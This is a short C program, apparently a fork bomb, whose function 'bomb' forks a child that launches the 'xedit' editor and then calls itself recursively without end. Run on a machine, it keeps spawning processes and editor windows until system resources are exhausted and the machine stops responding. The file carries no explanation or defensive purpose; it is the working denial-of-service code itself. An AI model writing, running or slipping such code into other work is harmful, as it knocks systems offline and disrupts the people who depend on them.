#include <stdio.h>
#include <unistd.h>

int bomb()
{
  char* command = "xedit";
  char* argument_list[] = {"xedit", "", NULL};

  if (fork() == 0) {
      int status_code = execvp(command, argument_list);
      if (status_code == -1) {
          printf("Terminated Incorrectly\n");
          return 1;
      }
  }

  return bomb();
}

int main() {
    bomb();
    return 0;

}
